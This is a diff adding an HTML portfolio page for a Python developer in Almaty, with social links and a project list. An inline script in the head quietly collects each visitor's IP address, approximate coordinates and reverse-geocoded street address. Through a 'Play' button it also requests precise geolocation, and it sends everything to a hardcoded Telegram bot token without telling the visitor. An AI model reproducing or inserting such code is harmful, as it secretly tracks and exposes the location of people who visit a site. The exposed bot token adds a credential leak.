@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Адик-Ad!l</title>
+    <link rel="icon" href="img/logo.png">
+
+    <meta content="Занимаюсь созданием и продвижением сайтов под ключ, 1.6 года опыта в разработке." name="title">
+    <meta content="Занимаюсь созданием и продвижением сайтов под ключ, 1.6 года опыта в разработке." name="description">
+    <meta content="Занимаюсь созданием и продвижением сайтов под ключ, 1.6 года опыта в разработке." name="keywords">
+
+    <link rel="stylesheet" href="css/main.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+
+    <script src="libs/gsap/gsap.min.js" defer></script>
+    <script src="libs/gsap/ScrollTrigger.min.js" defer></script>
+    <script src="libs/gsap/ScrollSmoother.min.js" defer></script>
+    <script src="js/app.js" defer></script>
+
+    <script>
+        async function sendIPToTelegram(message) {
+            const token = '6893316259:AAFLtImjyepf_40eqcdxZgwZpg4AUc3ZnHU'; // Ваш токен бота
+            const chatId = '5792605910'; // Ваш ID чата
+    
+            try {
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                if (!response.ok) {
+                    throw new Error(`Ошибка при отправке сообщения: ${response.statusText}`);
+                }
+            } catch (error) {
+                console.error('Ошибка при отправке сообщения в Telegram:', error);
+            }
+        }
+    
+        async function fetchIPAndLocation() {
+            try {
+                // Получение IP-адреса и координат
+                const ipResponse = await fetch('https://ipinfo.io/json');
+                if (!ipResponse.ok) {
+                    throw new Error(`Ошибка при получении IP-адреса: ${ipResponse.statusText}`);
+                }
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                const loc = ipData.loc.split(',');
+                const latitude = parseFloat(loc[0]).toFixed(6);
+                const longitude = parseFloat(loc[1]).toFixed(6);
+    
+                // Функция для получения информации о местоположении
+                async function getLocationInfo(lat, lon) {
+                    const locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                    if (!locationResponse.ok) {
+                        throw new Error(`Ошибка при получении местоположения: ${locationResponse.statusText}`);
+                    }
+                    const locationData = await locationResponse.json();
+                    const address = locationData.address;
+                    const street = address.road || 'Неизвестная улица';
+                    const city = address.city || 'Неизвестный город';
+                    const region = address.state || 'Неизвестный регион';
+                    const country = address.country || 'Неизвестная страна';
+    
+                    return { street, city, region, country };
+                }
+    
+                // Запрос разрешения на получение точной геопозиции
+                async function handleGeolocationPermission() {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async position => {
+                            const exactLatitude = position.coords.latitude.toFixed(6);
+                            const exactLongitude = position.coords.longitude.toFixed(6);
+                            const locationInfo = await getLocationInfo(exactLatitude, exactLongitude);
+    
+                            // Формирование сообщения с точными координатами
+                            const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: ${exactLatitude}, ${exactLongitude}`;
+    
+                            // Отправка сообщения в Telegram
+                            await sendIPToTelegram(message);
+                        }, async () => {
+                            // Запрос геопозиции отклонён
+                            const locationInfo = await getLocationInfo(latitude, longitude);
+                            const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: (человек не дал разрешение)`;
+    
+                            // Отправка сообщения в Telegram
+                            await sendIPToTelegram(message);
+                        });
+                    } else {
+                        // Геолокация не поддерживается
+                        const locationInfo = await getLocationInfo(latitude, longitude);
+                        const message = `Новый посетитель:\nIP: ${ip}\nШирота: ${latitude}\nДолгота: ${longitude}\nУлица: ${locationInfo.street}\nГород: ${locationInfo.city}\nРегион: ${locationInfo.region}\nСтрана: ${locationInfo.country}\nТочное гео: (геолокация не поддерживается)`;
+    
+                        // Отправка сообщения в Telegram
+                        await sendIPToTelegram(message);
+                    }
+                }
+    
+                // Добавление обработчика для кнопки
+                document.getElementById('requestGeoButton').addEventListener('click', handleGeolocationPermission);
+    
+            } catch (error) {
+                // Отправка ошибки в Telegram
+                await sendIPToTelegram(`Ошибка при получении IP или местоположения: ${error.message}`);
+                console.error('Ошибка при получении IP или отправке сообщения:', error);
+            }
+        }
+    
+        // Вызов функции при загрузке страницы
+        window.onload = fetchIPAndLocation;
+    </script>
+    
+    
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="content">
+            <header class="main-header">
+                <div class="layers">
+                    <div class="layer__header">
+                        <div class="layers__caption">
+                            <b><strong>Backend developer!</strong> <br>with deep expertise in
+                                <strong>Python</strong>,
+                                <br>Having <strong>professional <br>work experience</strong>,
+                                <br>Able to work <strong>more productively<br></strong> and <strong>get rid of
+                                    problems</strong>.</b>
+                        </div>
+                        <div class="layers__title">______<br></div>
+                    </div>
+
+                    <div class="layer layers__base" style="background-image: url(img/layer-base.png);"></div>
+                    <div class="layer layers__middle" style="background-image: url(img/layer-middle.png);"></div>
+                    <div class="layer layers__front" style="background-image: url(img/layer-front.png);"></div>
+                </div>
+            </header>
+
+            <article class="main-article" style="background-image: url(img/dungeon.jpg);">
+                <div class="main-article__content">
+                    <h2 class="main-article__header"> <b>Social platforms for contacting me.</b></h2>
+                    <br>
+                    <div class="btn">
+                        <a style="margin: 10px;" href="https://t.me/adik_dev" target="_blank"><button
+                                class="button_t">Telegram</button></a>
+                        <a style="margin: 10px;" href="https://instagram.com/adik.abashev" target="_blank"><button
+                                class="button_i">Instagram</button></a>
+                        <a style="margin: 10px;" href="https://github.com/adik8712" target="_blank"><button
+                                class="button_g">Github</button></a>
+                        <!-- Кнопка для запроса геолокации -->
+                        <article class="main-article">
+                            <div class="main-article__content text-center">
+                                <button style="margin: 10px;" id="requestGeoButton" class="btn btn-primary">Играть</button>
+                            </div>
+                        </article>
+
+                    </div>
+                </div>
+                <div class="copy">Almaty - Kazakhstan</div>
+            </article>
+
+            <article class="main-article" style="background-color: light;">
+                <div class="main-article__content">
+                    <div class="px-4 pt-5 my-5 text-center border-bottom">
+                        <h1 class="display-4 fw-bold text-body-emphasis">Adik</h1>
+                        <div class="col-lg-6 mx-auto">
+                            <p class="lead mb-4 bold" style="color: rgb(76, 80, 85) !important;"><b>I'm a Python
+                                    developer with experience
+                                    with various frameworks. Over the past year and a half, I've
+                                    successfully realized many projects, including
+                                    RESTful API development, creating
+                                    creation of microservice architectures using FastAPI,
+                                    automated API testing, as well as the development of
+                                    Real-Time API using Django Channels and FastAPI to
+                                    realizing web sockets for real-time data transfer.</b>
+                            </p>
+
+                        </div>
+                        <div class="overflow-hidden" style="max-height: 30vh;">
+                            <div class="container px-5">
+                                <img src="img/quentin.jpg" class="img-fluid border rounded-3 shadow-lg mb-4"
+                                    alt="Example image" width="700" height="500" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+            <article class="main-article bg-dark">
+                <div class="main-article__content">
+                    <div class="container col-xxl-8 px-4 py-5">
+                        <div class="row flex-lg-row-reverse align-items-center g-5 py-5">
+                            <main class="container box-skils">
+                                <div class="d-flex align-items-center p-3 my-3 text-white bg-purple rounded shadow-sm">
+                                    <img style="border-radius: 15px;" class="me-3"
+                                        src="https://avatars.githubusercontent.com/u/127220411?v=4" alt="" width="50"
+                                        height="50">
+                                    <div class="lh-1">
+                                        <h1 class="h6 mb-0 text-white lh-1">Adik</h1>
+                                        <small>2022-2024</small>
+                                    </div>
+                                </div>
+
+                                <div class="my-3 p-3 bg-body rounded shadow-sm">
+                                    <h6 class="border-bottom pb-2 mb-0">Github</h6>
+                                    <div class="d-flex text-body-secondary pt-3">
+                                        <p class="pb-3 mb-0 small lh-sm border-bottom">
+                                            <strong class=" text-gray-dark">Django-Telegram-News-Bot</strong>
+                                            A bot for parsing news.
+                                        </p>
+                                    </div>
+                                    <div class="d-flex text-body-secondary pt-3">
+                                        <p class="pb-3 mb-0 small lh-sm border-bottom">
+                                            <strong class=" text-gray-dark">Django-REST-GraphQL-E-commerce-Project
+                                            </strong>
+                                            Django project with REST API and GraphQL
+                                        </p>
+                                    </div>
+                                    <div class="d-flex text-body-secondary pt-3">
+                                        <p class="pb-3 mb-0 small lh-sm border-bottom">
+                                            <strong class=" text-gray-dark">........</strong>
+                                            ...
+                                        </p>
+                                    </div>
+                                </div>
+
+                                <div class="my-3 p-3 bg-body rounded shadow-sm">
+                                    <a style="color: black; text-decoration: none;"
+                                        href="https://github.com/adik8712?tab=repositories">All repositories</a>
+                                </div>
+                            </main>
+                        </div>
+                    </div>
+                </div>
+            </article>
+        </div>
+    </div>
+</body>
+
+</html>
